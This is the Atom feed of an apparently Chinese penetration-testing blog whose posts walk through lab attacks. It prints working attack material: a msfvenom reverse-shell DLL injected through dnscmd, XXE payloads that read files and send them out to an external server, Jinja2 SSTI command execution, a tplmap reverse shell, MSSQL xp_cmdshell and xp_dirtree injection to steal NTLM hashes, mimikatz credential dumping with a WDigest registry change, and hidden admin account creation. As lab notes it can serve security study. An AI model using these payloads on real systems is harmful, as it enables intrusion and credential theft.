<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Twe1ve&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/"/>
  <updated>2020-05-01T04:51:06.725Z</updated>
  <id>https://github.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域渗透之隐藏管理员用户和派生本地管理员</title>
    <link href="https://github.com/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/"/>
    <id>https://github.com/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/</id>
    <published>2020-05-01T04:34:28.000Z</published>
    <updated>2020-05-01T04:51:06.725Z</updated>
    
    <content type="html"><![CDATA[<p>典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）</p><p>常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。</p><p>这个过程往往伴随着隐藏管理员账户和派生本地管理员的发现</p><p><strong>域隐藏管理账户：</strong></p><p>A是“技术管理”组的成员，”技术管理”组是“ DOMAIN ADMINS”组的成员，因此A是域管理员。</p><p>由于A并不直接在Domain Admins组中，所以当我们直接查询”Domain Admins“组成员时，并不会直接看到A。而是找到“技术管理”组，然后必须通过枚举”技术管理”组才能找到其成员A</p><p><strong>Derivative Local Admins（派生本地管理员）：</strong><br>在我的理解中，派生本地管理员是一种特殊的隐藏管理账户：</p><p><a href="http://www.sixdub.net/?p=591" target="_blank" rel="noopener">经典案例</a>：（在这个例子中，Sally是WorkStation A中的派生本地管理员）</p><p><img src="1.png" alt=""></p><p><strong>环境描述：</strong></p><ul><li><p>域组 “Network Ops”是”Wokstation A”的本地管理组的成员（而这里A恰恰是域管成员Tim登录的机子）  </p></li><li><p>域组”Workstation Admins”是”Workstation B”的本地管理组的成员，Sally和Fred是域组”Workstation B”的成员</p></li><li><p>Fred同时又是域组”Network Ops”中的成员，Fred在 “Workstation B”上登录</p></li><li><p>Sally在 “Workstation C”上登录</p></li></ul><p>通过获取 “Workstation C”的系统权限，提取Sally的凭证，借助这个凭证访问”Workstation B”，在”Workstation B”提取之后提取Fred凭证，借助Fred凭证获取”Workstation A”的管理员权限。</p><p>直接截取原文中的实际利用步骤：</p><p><img src="2.png" alt=""></p><p>则可以得出结论：能够获取到作为（域管登录机子）本地管理员组的成员的域组中成员凭据…的其他机子中的用户…即为该机子的派生管理员（手动断句，方便阅读）</p><p>那么我们简化一下上边的图，画出自己的理解图：</p><p><img src="3.png" alt=""></p><p>隐藏管理员账户可以通过上边例子中的方法手动查找，也可以使用Bloodhound更方便查找</p><p><strong>使用Bloodhound查找隐藏管理账户</strong>的几种方法：</p><ul><li>Map Domain Trust</li><li>左键点击，直接在视图左侧查看节点信息；或者右键单击一个节点，然后选择子选项“ Expand”以查看该节点的成员</li><li>搜索“Domain Controller“ —-&gt; Group Member（查找组）—-&gt;（左击其中的组）Local Admin Rights–&gt;Derivative Local Admin Rights</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）&lt;/p&gt;
&lt;p&gt;常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。&lt;/p&gt;
&lt;p&gt;这个过程往往
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之DNSadmins</title>
    <link href="https://github.com/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/"/>
    <id>https://github.com/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/</id>
    <published>2020-04-30T12:54:39.000Z</published>
    <updated>2020-04-30T12:58:13.891Z</updated>
    
    <content type="html"><![CDATA[<p>默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限</p><p><strong>利用条件：</strong></p><p>拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权</p><p><strong>whoami /groups  查看用户组</strong></p><p><img src="1.png" alt=""></p><p><strong>制作dll：</strong></p><pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll</code></pre><p><strong>开启smb共享：</strong>（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）</p><pre><code>sudo impacket-smbserver tw .</code></pre><p><strong>注入dll</strong></p><pre><code>dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll</code></pre><p><strong>监听：</strong></p><pre><code>nc -lvvp 444</code></pre><p><strong>重启dns</strong>致使paylload生效：</p><pre><code>sc.exe stop dnssc.exe start dns</code></pre><p>或</p><pre><code>sc.exe \\10.10.10.169 stop dnssc.exe \\10.10.10.169 start dns</code></pre><p><img src="2.png" alt="">  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XXE漏洞详解</title>
    <link href="https://github.com/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>https://github.com/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-04-26T15:16:55.000Z</published>
    <updated>2020-04-26T15:38:20.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01、XXE原理："><a href="#0x01、XXE原理：" class="headerlink" title="0x01、XXE原理："></a>0x01、XXE原理：</h1><p>XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）</p><h2 id="1、XML：Extensible-Markup-Language，可扩展标记基础"><a href="#1、XML：Extensible-Markup-Language，可扩展标记基础" class="headerlink" title="1、XML：Extensible Markup Language，可扩展标记基础"></a><strong>1、XML：Extensible Markup Language，可扩展标记基础</strong></h2><p>XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：</p><ul><li><p>XML元素</p></li><li><p>属性</p></li><li><p>实体     </p></li></ul><p><strong>以一个简单的XXE POC为例：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明&lt;!DOCTYPE test [                                ####文档类型定义（DTD）&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名</code></pre><h2 id="2-DTD（文档类型定义）实体"><a href="#2-DTD（文档类型定义）实体" class="headerlink" title="2.DTD（文档类型定义）实体"></a>2.DTD（文档类型定义）实体</h2><ul><li><p>定义XML文件中有哪些模块，这些模块能包含什么样的内容</p></li><li><p>DTD可以在XML文档内声明，也可以外部引用</p></li></ul><p><strong>内部声明DTD：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot; &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型  &lt;!ELEMENT from    (#PCDATA)&gt;       &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body    (#PCDATA)&gt;]&gt;&lt;note&gt; &lt;to&gt;George&lt;/to&gt;  &lt;from&gt;John&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><p><strong>引用外部DTD：</strong></p><p>DTD文件内容：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型&lt;!ELEMENT from    (#PCDATA)&gt;     &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body    (#PCDATA)&gt;</code></pre><p>引用DTD：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;&lt;note&gt;  &lt;to&gt;George&lt;/to&gt;  &lt;from&gt;John&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><blockquote><p>ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询</p></blockquote><h2 id="3、为什么能形成注入？"><a href="#3、为什么能形成注入？" class="headerlink" title="3、为什么能形成注入？"></a>3、为什么能形成注入？</h2><pre><code>XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换</code></pre><p>简单的漏洞代码：</p><pre><code>&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&apos;php://input&apos;);$dom = new DOMDocument();# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);$user = $creds-&gt;user;$pass = $creds-&gt;pass;#回显信息  echo &quot;You have logged in as user $user&quot;;###漏洞触发点在user元素中?&gt;</code></pre><h1 id="0x02、XXE漏洞验证："><a href="#0x02、XXE漏洞验证：" class="headerlink" title="0x02、XXE漏洞验证："></a>0x02、XXE漏洞验证：</h1><p>如上漏洞代码poc，paylaod.txt：</p><pre><code>&lt;creds&gt;&lt;user&gt; Ed &lt;/user&gt;&lt;pass&gt; mypass &lt;/pass&gt;&lt;/creds&gt;</code></pre><blockquote><p>tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）</p></blockquote><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;</code></pre><p>curl验证：</p><pre><code>curl -d @payload.txt http://localhost/xml_injectable.php</code></pre><p>显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息</p><p><img src="1.png" alt=""></p><h1 id="0x03、XXE能做什么："><a href="#0x03、XXE能做什么：" class="headerlink" title="0x03、XXE能做什么："></a>0x03、XXE能做什么：</h1><p><strong>[1]文件读取</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="2.png" alt=""></p><p><strong>[2]SSRF探测端口内网服务</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="3.png" alt=""></p><p>尝试在XXE漏洞代码中加入：<br>    error_reporting(0);</p><p><img src="4.png" alt=""></p><p>上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）</p><p><strong>[3]Bind XXE （OOB）外带数据（无回显攻击）</strong></p><p>[代码中注释掉 echo “You have logged in as user $user”;]</p><p><strong>OOB  文件读取</strong></p><p>evil.dtd：</p><pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;</code></pre><p>payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;%dtd; %all;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="5.png" alt=""></p><p><strong>OOB  探测内网端口及服务：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;%dtd; %all;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><h1 id="0x04、攻击内网"><a href="#0x04、攻击内网" class="headerlink" title="0x04、攻击内网"></a>0x04、攻击内网</h1><p><strong>SSRF+内网服务命令执行实现内网攻击</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><strong>系统命令执行</strong></p><p>(PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><strong>0x05、使用递归实体扩展进行DOS攻击</strong></p><h1 id="0x06、XXE漏洞挖掘："><a href="#0x06、XXE漏洞挖掘：" class="headerlink" title="0x06、XXE漏洞挖掘："></a>0x06、XXE漏洞挖掘：</h1><p> 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞</p><p>比如这个案例：<a href="https://www.freebuf.com/vuls/167087.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/167087.html</a> ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值</p><pre><code>POST /action HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 7foo=bar</code></pre><p>等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）</p><pre><code>POST /action HTTP/1.0Content-Type: text/xmlContent-Length: 52&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</code></pre><p><strong>1.文件上传XXE</strong>（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）</p><p><strong>2.传输内容XXE</strong> （支持XML）</p><p><strong>扩展之Json端点上的XXE</strong>：</p><p>原始JSON</p><pre><code>{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}</code></pre><p>XML转换(需要添加一个根元素，不然会成为无效的XML文档)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;</code></pre><p>以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）</p><p><img src="6.png" alt=""></p><p>成功验证XXE</p><p><img src="7.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01、XXE原理：&quot;&gt;&lt;a href=&quot;#0x01、XXE原理：&quot; class=&quot;headerlink&quot; title=&quot;0x01、XXE原理：&quot;&gt;&lt;/a&gt;0x01、XXE原理：&lt;/h1&gt;&lt;p&gt;XXE：XML External Entity Injection；
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>调用API绕过杀软添加用户</title>
    <link href="https://github.com/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"/>
    <id>https://github.com/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/</id>
    <published>2020-04-26T10:15:40.000Z</published>
    <updated>2020-04-26T10:32:15.700Z</updated>
    
    <content type="html"><![CDATA[<p><strong>创建隐藏账户：</strong></p><pre><code>net user tw$ password /add  ###用户名为tw，密码为password的也可以通过修改注册表实现，需要system权限    </code></pre><p><strong>如何发现隐藏账户：</strong></p><p>通过组查看：</p><pre><code>net localgroup administrators net localgroup users</code></pre><p>直接查看注册表，有什么用户一目了然<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</p><p>一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过</p><p><strong>实现：</strong></p><p>微软提供<a href="https://docs.microsoft.com/en-us/windows/win32/netmgmt/creating-a-local-group-and-adding-a-user" target="_blank" rel="noopener">C++实现</a>原型：</p><pre><code>#ifndef UNICODE#define UNICODE#endif#pragma comment(lib, &quot;netapi32.lib&quot;)#include &lt;stdio.h&gt;#include &lt;assert.h&gt;#include &lt;windows.h&gt; #include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[]){   LPGROUP_USERS_INFO_0 pBuf = NULL;   DWORD dwLevel = 0;   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;   DWORD dwEntriesRead = 0;   DWORD dwTotalEntries = 0;   NET_API_STATUS nStatus;   if (argc != 3)   {  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);  exit(1);   }   nStatus = NetUserGetGroups(argv[1],  argv[2],  dwLevel,  (LPBYTE*)&amp;pBuf,  dwPrefMaxLen,  &amp;dwEntriesRead,  &amp;dwTotalEntries);   if (nStatus == NERR_Success)   {  LPGROUP_USERS_INFO_0 pTmpBuf;  DWORD i;  DWORD dwTotalCount = 0;  if ((pTmpBuf = pBuf) != NULL)  { fprintf(stderr, &quot;\nGlobal group(s):\n&quot;); for (i = 0; i &lt; dwEntriesRead; i++) {assert(pTmpBuf != NULL);if (pTmpBuf == NULL){   fprintf(stderr, &quot;An access violation has occurred\n&quot;);   break;}wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);pTmpBuf++;dwTotalCount++; }  }  if (dwEntriesRead &lt; dwTotalEntries) fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);   }   else  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);   if (pBuf != NULL)  NetApiBufferFree(pBuf);   return 0;}</code></pre><p>NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组</p><p>我用C实现效果如下：<br><img src="1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;创建隐藏账户：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;st
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SSTI[服务器模板注入]</title>
    <link href="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2020-04-26T05:32:06.000Z</published>
    <updated>2020-04-26T05:40:46.401Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞成因：</strong></p><p>用户输入未经过滤就交给引擎处理</p><p><a href="http://www.onelinerizer.com/" target="_blank" rel="noopener">将python语句编译成一句话： </a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">不同类型SSTI paylaod: </a></p><p>SSTI模板注入常见引擎：</p><p><img src="1.png" alt=""></p><p>判断是哪种类型SSTI</p><p><img src="2.png" alt=""></p><p><strong>一个实例：</strong></p><p>nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI<br>返回输入内容，已知</p><p><img src="3.png" alt=""></p><p><strong>检测SSTI</strong></p><p><img src="4.png" alt=""></p><p>name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）</p><p>确定是jinja之后，尝试文件读取和命令执行</p><p><strong>读取文件</strong></p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code></pre><p><img src="5.png" alt=""></p><p><strong>命令执行：</strong></p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}{{ config.from_pyfile('/tmp/evilconfig.cfg') }}{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}</code></pre><p><a href="https://github.com/epinna/tplmap">SSTI注入工具tplmap</a>： </p><pre><code>python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;漏洞成因：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用户输入未经过滤就交给引擎处理&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.onelinerizer.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;将python语句编译成一句
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MSSQL NTLM stealer</title>
    <link href="https://github.com/2020/04/26/MSSQL-NTLM-stealer/"/>
    <id>https://github.com/2020/04/26/MSSQL-NTLM-stealer/</id>
    <published>2020-04-26T05:24:48.000Z</published>
    <updated>2020-04-26T05:31:15.481Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">可窃取NTLM的漏洞及利用方式</a></p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。<br>利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。</p><p>如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希</p><h2 id="环境说明："><a href="#环境说明：" class="headerlink" title="环境说明："></a><strong>环境说明：</strong></h2><p><a href="https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL" target="_blank" rel="noopener">https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL</a> SQLi，发现高权限账户但无法读取密码</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="1.png" alt=""></p><p>默认情况ASP/MSSQL支持堆叠注入：</p><p>常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令</p><pre><code>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -</code></pre><p>本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：</p><pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -</code></pre><p>master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed</p><p>猜测是没有权限的问题，<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">想到xp_dirtree外带数据</a>：</p><p>payload：</p><pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-</code></pre><p><img src="2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;可窃取NTLM的漏洞及利用
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>mimikatz抓取密码小记</title>
    <link href="https://github.com/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"/>
    <id>https://github.com/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/</id>
    <published>2020-04-26T05:22:42.000Z</published>
    <updated>2020-04-26T05:23:08.530Z</updated>
    
    <content type="html"><![CDATA[<p><strong>1、直接抓取本机：</strong></p><p>[1]#privilege::debug          //提升权限<br>[2]#sekurlsa::logonpasswords  //抓取密码</p><p><strong>离线破解lsass.dmp</strong></p><p>[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来</p><p>[2]#privilege::debug          //提升权限</p><p>[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp</p><p>[4]#sekurlsa::logonpasswords  //抓取密码</p><p>踩坑点：</p><p>[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)<br>相对路径报错    </p><p>解决方法：lsass.dmp要给完整路径，</p><p>[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key import<br>mimikatz版本过低</p><p>解决方法：使用2.0版本</p><p>[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list</p><p>windows 2012之后明文抓取均会出现这个报错</p><p>需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了</p><p><strong>（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）</strong></p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;1、直接抓取本机：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[1]#privilege::debug          //提升权限&lt;br&gt;[2]#sekurlsa::logonpasswords  //抓取密码&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;离线破解lsass.d
      
    
    </summary>
    
    
    
